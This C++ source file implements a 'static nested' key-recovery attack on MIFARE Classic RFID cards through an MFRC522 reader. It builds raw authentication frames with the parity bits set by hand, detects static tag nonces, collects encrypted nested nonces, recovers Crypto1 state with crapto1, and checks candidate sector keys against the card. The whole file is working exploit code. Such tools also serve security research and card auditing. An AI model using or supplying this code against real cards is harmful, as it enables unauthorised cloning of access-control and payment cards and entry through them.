#include "StaticNestedAttack.h"

extern "C" {
#include "utils/crypto/crapto1.h"
}

#include <cstring>

// ===================== Low-level helpers =====================

static uint8_t oddparity(uint8_t bt)
{
  return (0x9669 >> ((bt ^ (bt >> 4)) & 0xF)) & 1;
}

static uint64_t bytesToInt(const uint8_t* buf, uint8_t len)
{
  uint64_t nr = 0;
  for (int i = 0; i < len; i++)
    nr = (nr << 8) | buf[i];
  return nr;
}

static uint8_t isNonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, uint8_t* par)
{
  return ((oddparity((Nt >> 24) & 0xFF) == ((par[0]) ^ oddparity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) &
          (oddparity((Nt >> 16) & 0xFF) == ((par[1]) ^ oddparity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,  8))) &
          (oddparity((Nt >>  8) & 0xFF) == ((par[2]) ^ oddparity((NtEnc >>  8) & 0xFF) ^ BIT(Ks1,  0)))) ? 1 : 0;
}

// ISO14443-3 CRC-A
static void calcCRC(const uint8_t* data, uint8_t len, uint8_t* crc)
{
  uint32_t wCrc = 0x6363;
  for (uint8_t i = 0; i < len; i++) {
    uint8_t bt = data[i];
    bt = (bt ^ (uint8_t)(wCrc & 0xFF));
    bt = (bt ^ (bt << 4));
    wCrc = (wCrc >> 8) ^ ((uint32_t)bt << 8) ^ ((uint32_t)bt << 3) ^ ((uint32_t)bt >> 4);
  }
  crc[0] = (uint8_t)(wCrc & 0xFF);
  crc[1] = (uint8_t)((wCrc >> 8) & 0xFF);
}

// ===================== Raw frame encoding =====================

static uint8_t makeRawFrame(uint8_t* data, uint8_t dataLen, uint8_t* parBits, uint8_t* pkt)
{
  pkt[0] = data[0];
  pkt[1] = (parBits[0] | (data[1] << 1));
  int i;
  for (i = 2; i < dataLen; i++) {
    pkt[i]  = (parBits[i - 1] << (i - 1)) | (data[i - 1] >> (9 - i));
    pkt[i] |= (data[i] << i);
  }
  pkt[dataLen] = (parBits[dataLen - 1] << (i - 1)) | (data[dataLen - 1] >> (9 - i));
  return dataLen % 8;
}

static void extractData(uint8_t* pkt, uint8_t len, uint8_t* parBits, uint8_t* data)
{
  data[0] = pkt[0];
  int i;
  for (i = 1; i < len - 1; i++) {
    parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
    data[i] = (pkt[i] >> i) | (pkt[i + 1] << (8 - i));
  }
  parBits[i - 1] = (pkt[i] & (1 << (i - 1))) >> (i - 1);
}

// ===================== MFRC522 register-level IO =====================

static void parityOff(MFRC522_I2C* m)
{
  m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x10);
}

static void parityOn(MFRC522_I2C* m)
{
  m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x00);
}

static void resetPICC(MFRC522_I2C* m)
{
  m->PCD_AntennaOff();
  delay(10);
  m->PCD_AntennaOn();
  delay(10);
}

static bool initCom(MFRC522_I2C* m)
{
  for (int attempt = 0; attempt < 20; attempt++) {
    delay(10);
    uint8_t buf[2];
    uint8_t bufSize = sizeof(buf);
    if (m->PICC_RequestA(buf, &bufSize) != MFRC522_I2C::STATUS_OK) continue;
    if (m->PICC_Select(&m->uid) != MFRC522_I2C::STATUS_OK) continue;
    return true;
  }
  return false;
}

static bool piccIO(MFRC522_I2C* m, uint8_t cmd, uint8_t sendLen,
                   uint8_t* data, uint8_t bufLen, uint8_t validBits = 0)
{
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, MFRC522_I2C::PCD_Idle);
  m->PCD_WriteRegister(MFRC522_I2C::ComIrqReg, 0x7F);
  m->PCD_WriteRegister(MFRC522_I2C::FIFOLevelReg, 0x80);
  m->PCD_WriteRegister(MFRC522_I2C::FIFODataReg, sendLen, data);
  m->PCD_WriteRegister(MFRC522_I2C::BitFramingReg, validBits);
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, cmd);

  if (cmd == MFRC522_I2C::PCD_Transceive)
    m->PCD_SetRegisterBitMask(MFRC522_I2C::BitFramingReg, 0x80);

  uint8_t finishFlag = (cmd == MFRC522_I2C::PCD_Transceive ||
                        cmd == MFRC522_I2C::PCD_Receive) ? 0x30 : 0x10;

  for (int wd = 3000; wd > 0; --wd) {
    uint8_t irq = m->PCD_ReadRegister(MFRC522_I2C::ComIrqReg);
    if (irq & finishFlag) break;
    if (irq & 0x01 || wd == 1) return false;
  }

  uint8_t err = m->PCD_ReadRegister(MFRC522_I2C::ErrorReg);
  if (err & 0x11) return false;

  if (cmd == MFRC522_I2C::PCD_Transceive || cmd == MFRC522_I2C::PCD_Receive) {
    uint8_t n = m->PCD_ReadRegister(MFRC522_I2C::FIFOLevelReg);
    if (n > bufLen) return false;
    m->PCD_ReadRegister(MFRC522_I2C::FIFODataReg, n, data);
  }
  return true;
}

// ===================== Get tag nonce via raw auth =====================

static bool getTagNonce(MFRC522_I2C* module, uint8_t authCmd, uint8_t blockAddr,
                        uint32_t* outNt)
{
  uint8_t cmd[4], par[4], pkt[9];
  cmd[0] = authCmd;
  cmd[1] = blockAddr;
  calcCRC(cmd, 2, &cmd[2]);

  for (int i = 0; i < 4; i++)
    par[i] = oddparity(cmd[i]);

  uint8_t vb = makeRawFrame(cmd, 4, par, pkt);

  parityOff(module);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    parityOn(module);
    return false;
  }

  uint8_t data[4], rpar[4];
  extractData(pkt, 5, rpar, data);
  *outNt = (uint32_t)bytesToInt(data, 4);
  parityOn(module);
  return true;
}

// ===================== Manual auth + nested nonce collection =====================

static bool collectNestedNonce(MFRC522_I2C* module, uint32_t uid,
                                uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
                                uint8_t targetCmd, uint8_t targetBlock,
                                uint32_t staticNt,
                                uint32_t* outEncNt, uint8_t outPar[3])
{
  uint8_t pkt[9], par[8], data[8];

  parityOff(module);

  // Step 1: Send auth command for exploit block
  uint8_t cmd[4];
  cmd[0] = authCmd;
  cmd[1] = exploitBlock;
  calcCRC(cmd, 2, &cmd[2]);

  for (int i = 0; i < 4; i++)
    par[i] = oddparity(cmd[i]);

  uint8_t vb = makeRawFrame(cmd, 4, par, pkt);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    parityOn(module);
    return false;
  }

  extractData(pkt, 5, par, data);
  uint32_t n_T = (uint32_t)bytesToInt(data, 4);

  // Step 2: Init keystream with known key
  Crypto1State* ks = crypto1_create(knownKey);
  crypto1_word(ks, n_T ^ uid, 0);

  // Step 3: Encrypt reader nonce (zeros)
  uint8_t n_R[4] = {0};
  for (int i = 0; i < 4; i++) {
    data[i] = crypto1_byte(ks, n_R[i], 0) ^ n_R[i];
    par[i] = filter(ks->odd) ^ oddparity(n_R[i]);
  }

  n_T = prng_successor(n_T, 32);

  // Step 4: Encrypt reader answer
  for (int i = 4; i < 8; i++) {
    n_T = prng_successor(n_T, 8);
    data[i] = crypto1_byte(ks, 0x00, 0) ^ (n_T & 0xFF);
    par[i] = filter(ks->odd) ^ oddparity(n_T);
  }

  vb = makeRawFrame(data, 8, par, pkt);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
    parityOn(module);
    crypto1_destroy(ks);
    return false;
  }

  // Step 5: Verify tag answer
  extractData(pkt, 5, par, data);
  uint32_t a_T = (uint32_t)bytesToInt(data, 4);
  n_T = prng_successor(n_T, 32);
  a_T = crypto1_word(ks, 0x00, 0) ^ a_T;

  if (a_T != (n_T & 0xFFFFFFFF)) {
    parityOn(module);
    crypto1_destroy(ks);
    return false;
  }

  // Step 6: Send encrypted auth for TARGET block
  uint8_t unenc[4];
  unenc[0] = targetCmd;
  unenc[1] = targetBlock;
  calcCRC(unenc, 2, &unenc[2]);

  for (int i = 0; i < 4; i++) {
    data[i] = crypto1_byte(ks, 0x00, 0) ^ unenc[i];
    par[i] = filter(ks->odd) ^ oddparity(unenc[i]);
  }

  vb = makeRawFrame(data, 4, par, pkt);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    crypto1_destroy(ks);
    parityOn(module);
    return false;
  }

  crypto1_destroy(ks);

  // Step 7: Extract encrypted nonce from target
  extractData(pkt, 5, par, data);
  *outEncNt = (uint32_t)bytesToInt(data, 4);

  for (int i = 0; i < 3; i++)
    outPar[i] = (oddparity(data[i]) != par[i]);

  parityOn(module);
  return true;
}

// ===================== Verify candidate key =====================

static bool verifyKey(MFRC522_I2C* module, uint8_t authCmd, uint8_t blockAddr,
                      uint64_t candidateKey)
{
  MFRC522_I2C::MIFARE_Key mfKey;
  for (int i = 5; i >= 0; i--) {
    mfKey.keyByte[i] = (uint8_t)(candidateKey & 0xFF);
    candidateKey >>= 8;
  }

  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return false;

  uint8_t status = module->PCD_Authenticate(authCmd, blockAddr, &mfKey, &module->uid);
  module->PCD_StopCrypto1();
  return (status == MFRC522_I2C::STATUS_OK);
}

// ===================== Public API =====================

bool StaticNestedAttack::isStaticNonce(MFRC522_I2C* module, uint32_t uid,
                                        uint8_t authCmd, uint8_t block, uint64_t key)
{
  uint32_t nt1 = 0, nt2 = 0;

  // First auth
  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return false;
  if (!getTagNonce(module, authCmd, block, &nt1)) return false;

  // Second auth
  resetPICC(module);
  if (!initCom(module)) return false;
  if (!getTagNonce(module, authCmd, block, &nt2)) return false;

  return (nt1 == nt2 && nt1 != 0);
}

StaticNestedAttack::Result StaticNestedAttack::crack(
    MFRC522_I2C* module, uint32_t uid,
    uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
    uint8_t targetCmd, uint8_t targetBlock,
    ProgressFn progress)
{
  Result result;

  if (progress) {
    if (!progress("Detecting static nonce...", 5)) return result;
  }

  // Step 1: Get static nonce value
  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return result;

  uint32_t staticNt = 0;
  if (!getTagNonce(module, authCmd, exploitBlock, &staticNt)) return result;

  // Verify it's actually static
  resetPICC(module);
  if (!initCom(module)) return result;
  uint32_t nt2 = 0;
  if (!getTagNonce(module, authCmd, exploitBlock, &nt2)) return result;

  if (staticNt != nt2) {
    // Not a static nonce card — abort
    return result;
  }

  if (progress) {
    if (!progress("Collecting nonces...", 15)) return result;
  }

  // Step 2: Collect encrypted nonces from target sector
  static constexpr int COLLECT_NR = 3;
  uint32_t encNonces[COLLECT_NR];
  uint8_t parData[COLLECT_NR][3];
  int collected = 0;

  for (int attempt = 0; attempt < COLLECT_NR * 3 && collected < COLLECT_NR; attempt++) {
    resetPICC(module);
    if (!initCom(module)) continue;

    uint32_t encNt;
    uint8_t par[3];
    if (collectNestedNonce(module, uid, authCmd, exploitBlock, knownKey,
                            targetCmd, targetBlock, staticNt, &encNt, par)) {
      encNonces[collected] = encNt;
      memcpy(parData[collected], par, 3);
      collected++;

      if (progress) {
        char msg[48];
        snprintf(msg, sizeof(msg), "Collected %d/%d nonces", collected, COLLECT_NR);
        if (!progress(msg, 15 + collected * 20)) return result;
      }
    }
  }

  if (collected == 0) return result;

  // Step 3: Key recovery — static nonce means ks = encNt ⊕ staticNt
  if (progress) {
    if (!progress("Recovering key...", 70)) return result;
  }

  uint32_t ks = encNonces[0] ^ staticNt;

  Crypto1State* revstate = lfsr_recovery32(ks, staticNt ^ uid);
  if (!revstate) return result;

  // Step 4: Verify candidates
  if (progress) {
    if (!progress("Verifying candidates...", 85)) return result;
  }

  Crypto1State* rs = revstate;
  int checked = 0;
  while (rs->odd != 0 || rs->even != 0) {
    lfsr_rollback_word(rs, staticNt ^ uid, 0);
    uint64_t candidateKey;
    crypto1_get_lfsr(rs, &candidateKey);

    // Quick software check against other collected nonces
    bool softMatch = true;
    for (int i = 1; i < collected && softMatch; i++) {
      Crypto1State* test = crypto1_create(candidateKey);
      crypto1_word(test, uid ^ staticNt, 0);
      uint32_t testKs = crypto1_word(test, 0, 0);
      crypto1_destroy(test);
      if ((encNonces[i] ^ staticNt) != testKs) softMatch = false;
    }

    if (softMatch) {
      // Verify against actual card
      if (verifyKey(module, targetCmd, targetBlock, candidateKey)) {
        result.success = true;
        result.key = candidateKey;
        free(revstate);
        parityOn(module);
        return result;
      }
    }

    rs++;
    checked++;
    if (checked > 100000) break; // safety limit
  }

  free(revstate);
  parityOn(module);
  return result;
}
